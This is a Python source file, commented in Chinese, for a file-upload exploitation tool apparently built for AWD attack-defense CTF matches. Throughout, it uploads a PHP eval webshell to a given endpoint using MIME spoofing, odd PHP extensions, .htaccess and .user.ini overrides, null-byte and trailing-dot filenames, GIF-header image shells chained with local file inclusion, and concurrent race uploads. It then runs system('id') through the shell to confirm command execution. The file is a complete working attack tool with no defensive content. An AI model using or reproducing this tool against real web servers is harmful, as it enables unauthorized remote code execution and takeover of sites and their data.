#!/usr/bin/env python3
"""
AWD 文件上传漏洞利用工具
支持: 前端校验绕过, MIME 伪造, 双写绕过, .htaccess 上传, 文件包含配合
"""

import requests
import re
import os
import sys
import random
import string
import time
from urllib.parse import urljoin


class FileUploadExploiter:
    def __init__(self, upload_url, target_url=None, headers=None, cookies=None, timeout=15):
        self.upload_url = upload_url
        self.target_url = target_url or upload_url
        self.headers = headers or {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if self.cookies:
            for k, v in self.cookies.items():
                self.session.cookies.set(k, v)
        self.results = []
        self.uploaded_shell_url = None

    def _rand_name(self, prefix='awd', suffix='.php'):
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"{prefix}_{rand}{suffix}"

    def _shell_content(self, password='awd2024'):
        return f'<?php @eval($_POST["cmd"]);?>'

    def _send_upload(self, filename, content, mime_type=None, extra_headers=None):
        """发送文件上传请求"""
        headers = dict(self.headers)
        if extra_headers:
            headers.update(extra_headers)

        files = {'file': (filename, content, mime_type or 'application/octet-stream')}

        try:
            resp = self.session.post(
                self.upload_url,
                files=files,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=True
            )
            return resp
        except Exception as e:
            return None

    # ========= 1. 基础上传测试 =========
    def test_basic_upload(self):
        """基础文件上传测试"""
        print("\n[*] 基础上传测试")
        test_files = [
            ('test.txt', b'Hello AWD Test'),
            ('test.jpg', b'\xff\xd8\xff\xe0' + b'\x00\x10JFIF' + b'\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'),
        ]

        for filename, content in test_files:
            resp = self._send_upload(filename, content)
            if resp:
                if resp.status_code == 200:
                    upload_path = self._extract_upload_path(resp.text)
                    print(f"  [+] 上传成功: {filename}")
                    if upload_path:
                        print(f"      路径: {upload_path}")
                    self.results.append({
                        'type': 'basic_upload',
                        'filename': filename,
                        'status': 'success',
                        'upload_path': upload_path
                    })
                else:
                    print(f"  [-] 上传失败: {filename} (状态码={resp.status_code})")

    def _extract_upload_path(self, response_text):
        """从响应中提取上传路径"""
        patterns = [
            r'(?:upload|path|url|file|saved?)\s*[:=]\s*["\']?([^"\'<>]+)',
            r'(?:saved?|stored?)\s+(?:as|at)\s+["\']?([^"\'<>]+)',
            r'(/uploads?/[^\s"\'<>]+)',
            r'(/files?/[^\s"\'<>]+)',
            r'(/tmp/[^\s"\'<>]+)',
            r'(?:access|visit|download)\s*[:=]\s*["\']?([^"\'<>]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(1).strip()
        return None

    # ========= 2. 前端校验绕过 =========
    def bypass_frontend_validation(self):
        """绕过前端 JS 校验 (Burp/Repeater 场景)"""
        print("\n[*] 前端校验绕过测试")

        # 2a. MIME 类型伪造
        mime_bypass_tests = [
            ('awd_shell.php', self._shell_content(), 'image/jpeg'),
            ('awd_shell.php', self._shell_content(), 'image/png'),
            ('awd_shell.php', self._shell_content(), 'image/gif'),
            ('awd_shell.php', self._shell_content(), 'text/plain'),
            ('awd_shell.php', self._shell_content(), 'application/pdf'),
        ]

        for filename, content, mime in mime_bypass_tests:
            resp = self._send_upload(filename, content, mime_type=mime)
            if resp and resp.status_code == 200:
                upload_path = self._extract_upload_path(resp.text)
                if upload_path:
                    self._verify_uploaded_shell(upload_path)
                    return True

        # 2b. 扩展名大小写绕过
        ext_bypass_tests = ['awd_shell.PhP', 'awd_shell.pHP', 'awd_shell.PHP', 'awd_shell.Php']
        for filename in ext_bypass_tests:
            resp = self._send_upload(filename, self._shell_content())
            if resp and resp.status_code == 200:
                upload_path = self._extract_upload_path(resp.text)
                if upload_path:
                    self._verify_uploaded_shell(upload_path)
                    return True

        # 2c. 特殊后缀绕过
        special_exts = ['.phtml', '.pht', '.php5', '.php7', '.phps', '.php3', '.php4', '.shtml', '.asa', '.cer']
        for ext in special_exts:
            filename = f"awd_shell{ext}"
            resp = self._send_upload(filename, self._shell_content())
            if resp and resp.status_code == 200:
                upload_path = self._extract_upload_path(resp.text)
                if upload_path:
                    self._verify_uploaded_shell(upload_path)
                    return True

        print("  [-] 前端校验绕过失败")
        return False

    # ========= 3. .htaccess 上传 =========
    def upload_htaccess(self):
        """上传 .htaccess 接管解析"""
        print("\n[*] .htaccess 上传测试")

        htaccess_content = """AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .txt
Options +ExecCGI
AddHandler cgi-script .jpg
"""

        # 尝试上传 .htaccess
        resp = self._send_upload('.htaccess', htaccess_content)
        if resp and resp.status_code == 200:
            print("  [+] .htaccess 上传成功!")
            self.results.append({'type': 'htaccess', 'status': 'success'})

            # 再上传一张图片马
            shell_content = self._shell_content()
            resp2 = self._send_upload('awd_shell.jpg', shell_content, mime_type='image/jpeg')
            if resp2 and resp2.status_code == 200:
                upload_path = self._extract_upload_path(resp2.text)
                if upload_path:
                    shell_url = urljoin(self.target_url, upload_path)
                    self._verify_uploaded_shell(shell_url)
                return True

        # 尝试 .user.ini (PHP)
        ini_content = 'auto_prepend_file=awd_shell.jpg'
        resp = self._send_upload('.user.ini', ini_content)
        if resp and resp.status_code == 200:
            print("  [+] .user.ini 上传成功!")
            self.results.append({'type': 'user_ini', 'status': 'success'})
            return True

        print("  [-] .htaccess 上传失败")
        return False

    # ========= 4. 双写绕过 (Apache) =========
    def bypass_double_write(self):
        """双写绕过 (Apache + PHP)"""
        print("\n[*] 双写绕过测试")

        # Apache: 文件名末尾加空格或点号
        bypass_names = [
            'awd_shell.php ',
            'awd_shell.php.',
            'awd_shell.php..',
            'awd_shell .php',
            'awd_shell.Php',
            'awd_shell.php%00.jpg',
            'awd_shell.php\x00.jpg',
        ]

        for filename in bypass_names:
            resp = self._send_upload(filename, self._shell_content())
            if resp and resp.status_code == 200:
                upload_path = self._extract_upload_path(resp.text)
                if upload_path:
                    print(f"  [+] 双写绕过成功: {filename}")
                    self._verify_uploaded_shell(upload_path)
                    return True

        # 00 截断绕过
        null_byte_tests = [
            ('awd_shell.php%00.jpg', 'image/jpeg'),
            ('awd_shell.php%00.txt', 'text/plain'),
            ('awd_shell.php\x00.jpg', 'image/jpeg'),
        ]
        for filename, mime in null_byte_tests:
            resp = self._send_upload(filename, self._shell_content(), mime_type=mime)
            if resp and resp.status_code == 200:
                upload_path = self._extract_upload_path(resp.text)
                if upload_path:
                    print(f"  [+] 00截断绕过成功: {filename}")
                    self._verify_uploaded_shell(upload_path)
                    return True

        print("  [-] 双写绕过失败")
        return False

    # ========= 5. 图片马 + 文件包含配合 =========
    def upload_image_shell(self, lfi_url=None):
        """上传图片马, 然后配合 LFI 执行"""
        print("\n[*] 图片马上传")

        # GIF 89a 文件头 + PHP Shell
        gif_header = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        shell_content = self._shell_content().encode()
        image_shell = gif_header + b'\n' + shell_content

        # 尝试多种图片扩展名
        image_exts = ['.gif', '.jpg', '.png', '.jpeg']
        for ext in image_exts:
            filename = f"awd_img_shell{ext}"
            resp = self._send_upload(filename, image_shell, mime_type='image/gif')
            if resp and resp.status_code == 200:
                upload_path = self._extract_upload_path(resp.text)
                if upload_path:
                    print(f"  [+] 图片马上传成功: {filename}")
                    self.results.append({
                        'type': 'image_shell',
                        'filename': filename,
                        'path': upload_path
                    })

                    # 如果提供了 LFI 路径, 尝试包含执行
                    if lfi_url:
                        lfi_payload = f"{lfi_url}{upload_path}"
                        print(f"  [*] 尝试 LFI 包含: {lfi_payload}")
                        try:
                            lfi_resp = self.session.get(lfi_payload, timeout=self.timeout)
                            if 'Warning' not in lfi_resp.text and 'error' not in lfi_resp.text.lower():
                                print("  [+] LFI 包含执行成功!")
                                self.uploaded_shell_url = lfi_payload
                                return True
                        except Exception:
                            pass
                    return True

        print("  [-] 图片马上传失败")
        return False

    # ========= 6. 竞争条件 (Race Condition) =========
    def exploit_race_condition(self):
        """竞争条件攻击 (PHP 文件上传)"""
        print("\n[*] 竞争条件攻击测试")

        # 生成随机文件名
        rand_name = self._rand_name('awd_shell', '.php')
        content = self._shell_content()

        # 并发上传请求 (利用检查与执行间的时间差)
        import threading
        results = []

        def upload_worker():
            resp = self._send_upload(rand_name, content)
            results.append(resp)

        threads = []
        for _ in range(5):
            t = threading.Thread(target=upload_worker)
            threads.append(t)
            t.start()

        for t in threads:
            t.join(timeout=10)

        for resp in results:
            if resp and resp.status_code == 200:
                upload_path = self._extract_upload_path(resp.text)
                if upload_path:
                    self._verify_uploaded_shell(upload_path)
                    return True

        print("  [-] 竞争条件攻击失败")
        return False

    # ========= 验证 Webshell =========
    def _verify_uploaded_shell(self, path_or_url):
        """验证上传的 Webshell 是否可访问"""
        if path_or_url.startswith('http'):
            url = path_or_url
        else:
            url = urljoin(self.target_url, path_or_url)

        try:
            # 发送测试命令
            resp = self.session.post(
                url,
                data={'cmd': 'echo "AWD_SHELL_OK";system("id");'},
                timeout=self.timeout
            )
            if 'AWD_SHELL_OK' in resp.text or 'uid=' in resp.text:
                self.uploaded_shell_url = url
                print(f"  [!!!] Webshell 验证成功: {url}")
                print(f"      响应: {resp.text[:200]}")
                self.results.append({
                    'type': 'webshell_verified',
                    'url': url,
                    'severity': 'critical'
                })
                return True
        except Exception:
            pass

        # 尝试 GET 方式
        try:
            resp = self.session.get(url, timeout=self.timeout)
            if 'eval' in resp.text or 'php' in resp.text.lower():
                self.uploaded_shell_url = url
                print(f"  [+] Webshell 可能可访问: {url}")
        except Exception:
            pass

        return False

    # ========= 完整利用流程 =========
    def full_exploit(self, lfi_url=None):
        """执行完整文件上传利用流程"""
        print("="*60)
        print("  AWD 文件上传漏洞利用工具")
        print("="*60)
        print(f"上传接口: {self.upload_url}")

        # 1. 基础上传
        self.test_basic_upload()

        # 2. 尝试各种绕过方法
        bypass_methods = [
            self.bypass_frontend_validation,
            self.upload_htaccess,
            self.bypass_double_write,
            lambda: self.upload_image_shell(lfi_url),
            self.exploit_race_condition,
        ]

        for method in bypass_methods:
            if self.uploaded_shell_url:
                break
            method()

        if self.uploaded_shell_url:
            print(f"\n[!!!] 成功获取 Webshell: {self.uploaded_shell_url}")
        else:
            print("\n[-] 所有利用方法均失败")

        return self.results


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法:")
        print("  python3 file_upload.py <上传URL>")
        print("  python3 file_upload.py <上传URL> --target <目标URL>")
        print("  python3 file_upload.py <上传URL> --cookie 'session=xxx'")
        print("  python3 file_upload.py <上传URL> --lfi <LFI路径>")
        sys.exit(1)

    upload_url = sys.argv[1]
    target_url = None
    cookies = {}
    lfi_url = None

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--target' and i + 1 < len(sys.argv):
            target_url = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == '--cookie' and i + 1 < len(sys.argv):
            for pair in sys.argv[i+1].split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    cookies[k.strip()] = v.strip()
            i += 2
        elif sys.argv[i] == '--lfi' and i + 1 < len(sys.argv):
            lfi_url = sys.argv[i+1]
            i += 2
        else:
            i += 1

    exploiter = FileUploadExploiter(upload_url, target_url=target_url, cookies=cookies)
    exploiter.full_exploit(lfi_url=lfi_url)
